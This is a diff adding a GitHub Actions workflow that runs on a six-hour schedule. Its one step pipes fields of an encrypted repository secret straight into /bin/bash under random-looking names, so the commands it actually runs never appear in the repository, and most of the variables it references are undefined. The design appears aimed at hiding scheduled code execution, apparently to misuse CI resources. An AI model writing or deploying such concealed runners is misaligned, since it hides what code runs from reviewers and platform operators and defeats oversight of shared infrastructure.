@@ -1,0 +1,31 @@
+name: lishijianliang
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '58 0/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: lishijianliang
+        env:
+          u62988: ${{ secrets.u62988 }}
+        run: |
+          echo $u62988 | jq -r .dxe369 | /bin/bash
+          echo $d51 | jq -r .kkom666 | /bin/bash
+          echo $ou71 | jq -r .u59 | /bin/bash
+          echo $qv873 | jq -r .rz5404 | /bin/bash
+          echo $puhdk89 | jq -r .gqcb29821 | /bin/bash
+          echo $s24881 | jq -r .s91 | /bin/bash
+          echo $aol3 | jq -r .vzy8 | /bin/bash
+          echo $wha1 | jq -r .e059 | /bin/bash
+          echo $rrdl6927 | jq -r .xo145 | /bin/bash
+          echo $rqfd51317 | jq -r .cyqe0825 | /bin/bash
+          echo $uo682 | jq -r .fo81 | /bin/bash
+          echo $lvng052 | jq -r .ikst681 | /bin/bash
+          echo $nbe708 | jq -r .mpw866 | /bin/bash
+          echo $gc39 | jq -r .bwsl7 | /bin/bash
+          echo $kgbcu15 | jq -r .ohkp34481 | /bin/bash
+
